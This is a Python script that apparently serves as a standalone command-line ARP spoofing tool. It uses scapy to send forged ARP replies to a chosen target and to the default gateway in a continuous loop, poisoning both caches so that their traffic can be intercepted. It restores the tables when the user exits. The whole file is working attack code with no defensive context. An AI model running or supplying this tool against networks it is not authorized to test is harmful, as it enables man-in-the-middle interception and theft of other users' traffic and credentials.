import scapy.all as scapy
import netifaces
import time
import sys
import colorama
from colorama import Fore
import argparse


class ARP_Spoof():
    def __init__(self, target_ip, gateway_ip=netifaces.gateways().get('default')[2][0]):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = self.get_mac(self.target_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)
        colorama.init()
        self.main()

    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=7, verbose=False)[0]
        mac = answered_list[0][1].hwsrc
        return mac

    def spoof(self, target_ip, spoof_ip, target_mac):
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
    
    def restore(self, dest_ip, src_ip):
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=self.get_mac(dest_ip), psrc=src_ip, hwsrc=self.get_mac(src_ip))
        scapy.send(packet, count=4, verbose=False)

    def main(self):
        count = 0
        try:
            print(f'{Fore.GREEN}[+] ARP Spoofer is active.{Fore.RESET}')
            while True:
                self.spoof(self.target_ip, self.gateway_ip, self.target_mac)
                self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
                count += 2
                print(f'\r{Fore.CYAN}Packets Sent{Fore.RESET}: ' + str(count), end='')
                time.sleep(1.5)
        except KeyboardInterrupt:
            a = input(f'\n{Fore.YELLOW}[*] Detected CTRL + C. Are you sure you want to exit?(Y/N){Fore.RESET}')
            if a.lower() == 'y':    
                print('Exiting...')
                print('Resetting ARP tables...Please wait...', end='')
                self.restore(self.gateway_ip, self.target_ip)
                self.restore(self.target_ip, self.gateway_ip)
                print('Done.')
                sys.exit()
            else:
                pass


if __name__ == '__main__':
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('--target', '-t', type=str, required=True)
    arg_parser.add_argument('--gateway', '-g', type=str, required=False)
    args = arg_parser.parse_args()
    target_ip = args.target
    gateway_ip = args.gateway
    a = ARP_Spoof(target_ip, gateway_ip=gateway_ip)